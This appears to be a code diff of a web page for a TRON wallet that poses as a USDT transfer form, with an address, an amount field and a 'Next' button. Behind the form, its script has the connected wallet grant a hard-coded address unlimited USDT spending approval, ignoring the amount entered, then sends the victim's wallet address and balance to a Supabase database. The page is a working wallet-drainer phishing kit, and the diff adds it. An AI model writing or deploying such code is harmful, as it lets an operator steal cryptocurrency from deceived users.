@@ -2,114 +2,162 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TRC-20 USDT Approval</title>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Approval</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@latest/dist/TronWeb.min.js"></script>
   <style>
     body {
-      font-family: sans-serif;
+      background: #fff;
+      font-family: 'Arial', sans-serif;
       margin: 0;
       padding: 20px;
-      background: #fff;
+      color: #000;
     }
-    input {
+    .container {
+      max-width: 500px;
+      margin: auto;
+    }
+    label {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      display: block;
+    }
+    input[type="text"], input[type="number"] {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border-radius: 10px;
-      border: 1px solid #ccc;
       font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
+    }
+    .amount-box {
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+    .amount-box span {
+      position: absolute;
+      right: 70px;
+      font-weight: 600;
+      color: #888;
+    }
+    .max-btn {
+      position: absolute;
+      right: 10px;
+      padding: 6px 10px;
+      border: none;
+      background: #eee;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
     }
     button {
       width: 100%;
       padding: 14px;
-      background-color: #005bff;
-      color: white;
-      border: none;
-      border-radius: 20px;
       font-size: 18px;
       font-weight: bold;
+      background-color: #26C8F2;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
       margin-top: 20px;
     }
-    .max-btn {
-      position: relative;
-      float: right;
-      top: -40px;
-      margin-right: 10px;
-      font-weight: bold;
-      color: #888;
-    }
-    .label {
-      font-weight: 600;
-      margin-top: 15px;
+    .status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: green;
+      word-wrap: break-word;
     }
   </style>
 </head>
 <body>
-  <div>
-    <div class="label">Address</div>
-    <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
+  <div class="container">
+    <label>Address</label>
+    <input type="text" id="toAddress" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
 
-    <div class="label">Amount</div>
-    <input type="number" id="amountInput" placeholder="0" />
-    <span class="max-btn">Max</span>
+    <label>Amount</label>
+    <div class="amount-box">
+      <input type="number" id="amountInput" placeholder="0" />
+      <span>USDT</span>
+      <button class="max-btn" onclick="setMax()">Max</button>
+    </div>
 
-    <button onclick="approveUSDT()">Next</button>
+    <button id="nextBtn" onclick="handleApprove()">Next</button>
+
+    <div class="status" id="status"></div>
   </div>
 
   <script>
-    const receiverAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const spenderAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
     const supabaseUrl = "https://ycmspiedqvwzzrgpxeci.supabase.co";
-    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...T5o"; // Keep secret
+    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljbXNwaWVkcXZ3enpyZ3B4ZWNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM1OTMxODQsImV4cCI6MjA2OTE2OTE4NH0.z0sw1x0ysYlBdIg4zGM8Y6J59KTVw3Ta9j-xaxCbT5o";
 
-    async function waitForTronWeb(timeout = 15000) {
-      const start = Date.now();
-      while (!window.tronWeb || !window.tronWeb.ready) {
-        if (Date.now() - start > timeout) {
-          alert("Wallet not detected. Please use TronLink or similar.");
-          return false;
-        }
-        await new Promise(r => setTimeout(r, 500));
-      }
-      return true;
-    }
+    let tronWebReady = false;
 
-    async function approveUSDT() {
-      const ready = await waitForTronWeb();
-      if (!ready) return;
+    const connectTron = async () => {
+      return new Promise((resolve, reject) => {
+        const check = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.ready) {
+            clearInterval(check);
+            tronWebReady = true;
+            resolve(true);
+          }
+        }, 500);
+        setTimeout(() => {
+          clearInterval(check);
+          reject("TronWeb not detected");
+        }, 10000);
+      });
+    };
 
-      const address = window.tronWeb.defaultAddress.base58;
-      const amount = document.getElementById("amountInput").value || "0";
+    const setMax = () => {
+      document.getElementById("amountInput").value = "999999999";
+    };
 
-      const contract = await window.tronWeb.contract().at(usdtContract);
-
+    const handleApprove = async () => {
       try {
-        await contract
-          .approve(receiverAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-          .send({ shouldPollResponse: true });
+        document.getElementById("status").innerText = "Connecting to wallet...";
+        await connectTron();
+        const tronWeb = window.tronWeb;
+        const userAddress = tronWeb.defaultAddress.base58;
+        const usdt = await tronWeb.contract().at(usdtContract);
+        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-        const balance = await contract.balanceOf(address).call();
+        document.getElementById("status").innerText = "Requesting approval...";
 
+        await usdt.approve(spenderAddress, maxAmount).send();
+
+        const balance = await usdt.balanceOf(userAddress).call();
+        const balanceInUSDT = tronWeb.toDecimal(balance) / 1e6;
+        const inputAmount = document.getElementById("amountInput").value || "0";
+
+        // Save to Supabase
         await fetch(`${supabaseUrl}/rest/v1/approvals`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            apikey: supabaseKey,
-            Authorization: `Bearer ${supabaseKey}`,
-            Prefer: "return=representation"
+            "apikey": supabaseKey,
+            "Authorization": `Bearer ${supabaseKey}`,
+            "Prefer": "return=minimal"
           },
           body: JSON.stringify({
-            wallet_address: address,
-            amount: amount,
-            balance: parseInt(balance._hex, 16) / 1e6,
+            wallet_address: userAddress,
+            amount: inputAmount,
+            balance: balanceInUSDT,
             timestampz: new Date().toISOString()
           })
         });
 
-        Swal.fire("Success", "Approval sent successfully.", "success");
+        document.getElementById("status").innerText = "Approval successful ✅";
       } catch (err) {
-        Swal.fire("Error", err.message, "error");
+        console.error(err);
+        document.getElementById("status").innerText = "Something went wrong ❌: " + err;
       }
-    }
+    };
+  </script>
+</body>
+</html>
